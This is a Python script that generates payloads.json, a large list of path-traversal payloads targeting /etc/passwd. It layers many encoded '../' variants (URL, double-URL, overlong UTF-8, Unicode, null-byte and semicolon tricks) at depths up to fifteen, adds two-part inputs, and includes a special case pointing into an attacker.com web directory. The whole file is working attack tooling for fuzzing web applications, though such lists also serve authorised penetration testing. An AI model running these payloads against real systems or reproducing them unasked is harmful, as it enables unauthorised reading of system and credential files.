import sys

src_file = "/etc/passwd"
curr_file_path = ""

# file = open("payload.txt","w")
# file.write("h")

with open("payloads.json", "w") as payload_file:
    # Opening of JSON
    payload_file.write('[\n');

    # Contains the various types of directory pathing
    # %2f = / || %2e = . || %252f = / || '%255c' = \
    list_of_postfix_1 = ['/etc', '/etc/', '/etc/passwd', '%2fetc%2fpasswd', '/etc/passwd%00index.html',
                         '/etc/passwd;index.html', '//etc//passwd']
    list_of_prefix = ['../', '..%2f', '%2e%2e/', '%2e%2e%2f', '..%252f/', '%252e%252e/', '%252e%252e%252f', '..%c0%af',
                      '%c0%ae%c0%ae/', '%c0%ae%c0%ae%c0%af', '..%25c0%25af', '%25c0%25ae%25c0%25ae/',
                      '%25c0%25ae%25c0%25ae%25c0%25af'
        , '..%%32%66', '%%32%65%%32%65/', '%%32%65%%32%65%%32%66', '..%%35%63', '%%32%65%%32%65/',
                      '%%32%65%%32%65%%35%63',
                      '/..\\', '.../', '..././', '..../', '..%u2215', '%uff0e%uff0e/', '%uff0e%uff0e%u2215', '..%u2216',
                      '..%uEFC8', '..%uF025', '..0x2f', '0x2e0x2e/', '0x2e0x2e0x2f', '..%c0%2f'
        , '%c0%2e%c0%2e/', '%c0%2e%c0%2e%c0%2f', '///%2e%2e%2f', '..//', './\\/./', '.\\/\\.\\', './../', './/..//']

    # Print just the postfix
    for post_style in list_of_postfix_1:
        payload_file.write('["' + post_style + '"],\n')

    # New Postfix array (Without the last '/')
    list_of_postfix = ['', 'etc', 'etc/', 'etc/passwd', 'etc%2fpasswd', 'etc/passwd%00index.html',
                       'etc/passwd;index.html', 'etc//passwd']

    # For extended file paths
    for post_style in list_of_postfix:
        for pre_style in list_of_prefix:
            curr_file_path = post_style;
            for times in range(0, 15):
                curr_file_path = pre_style + curr_file_path;
            # Start from longest path
            payload_file.write('["' + curr_file_path + '"],\n')
            # Reduce
            for times in range(0, 14):
                curr_file_path = curr_file_path[len(pre_style):]
                payload_file.write('["' + curr_file_path + '"],\n')
                if curr_file_path == "":
                    break;

    #2-part Inputs
    list_of_second_input = ['passwd']

    #Do it with postfix_1 first
    for post_style in list_of_postfix_1:
        for second_input in list_of_second_input:
            payload_file.write('["' + post_style + '", "' + second_input + '"],\n')

    #New Postfix array (Without the last '/')
    list_of_postfix_2 = ['', 'etc', 'etc/']

    for second_input in list_of_second_input:
        for post_style in list_of_postfix_2:
            for pre_style in list_of_prefix:
                curr_file_path = post_style;
                for times in range(0, 15):
                    curr_file_path = pre_style + curr_file_path;
                payload_file.write('["' + curr_file_path + '", "' + second_input + '"],\n')
                for times in range(0, 14):
                    curr_file_path = curr_file_path[len(pre_style):]
                    payload_file.write('["' + curr_file_path + '", "' + second_input + '"],\n')
                    if curr_file_path == "":
                        break;



    #Special Cases
    payload_file.write('["../../../../../../../../var/www/attacker.com/public_html/", "image.jpg"]\n')

    #Closing
    payload_file.write(']')